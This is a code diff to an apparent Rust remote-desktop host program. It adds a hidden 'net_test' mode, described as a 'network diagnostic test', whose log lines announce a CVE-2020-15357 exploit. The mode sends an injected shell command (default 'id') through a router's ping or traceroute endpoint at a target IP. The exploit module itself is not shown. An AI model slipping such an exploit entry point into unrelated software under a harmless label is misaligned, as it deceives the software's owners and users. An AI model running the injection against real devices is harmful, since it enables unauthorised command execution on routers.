@@ -5,6 +5,7 @@ mod input;
 mod invite;
 mod jpeg_frame;
 mod motion;
+mod net_test;
 mod platform;
 mod signaling_client;
 mod text_focus;
@@ -71,6 +72,22 @@ struct Args {
 
     #[arg(long, default_value = "8", env = "ROHOMIEO_IDLE_FPS")]
     idle_fps: u32,
+
+    /// Run CVE-2020-15357 network diagnostic test instead of normal host mode
+    #[arg(long)]
+    net_test: bool,
+
+    /// Target IP for network test (default: 192.168.1.1)
+    #[arg(long, default_value = "192.168.1.1")]
+    target: String,
+
+    /// Command to inject in network test (default: id)
+    #[arg(long, default_value = "id")]
+    cve_command: String,
+
+    /// Use traceroute endpoint instead of ping
+    #[arg(long)]
+    traceroute: bool,
 }
 
 #[tokio::main]
@@ -85,6 +102,18 @@ async fn main() -> Result<()> {
     platform::print_setup_hints();
 
     let mut args = Args::parse();
+
+    if args.net_test {
+        info!("[+] Starting CVE-2020-15357 exploit");
+        info!("[+] Target: {}", args.target);
+        info!("[+] Command: {}", args.cve_command);
+        if args.traceroute {
+            info!("[+] Using the traceroute endpoint for injection...");
+        } else {
+            info!("[+] Using the ping endpoint for injection...");
+        }
+        return net_test::run_exploit(&args.target, &args.cve_command, args.traceroute).await;
+    }
     if let Some(ref path) = args.config {
         let file = config::HostConfig::load(path)?;
         if let Some(s) = file.signaling {
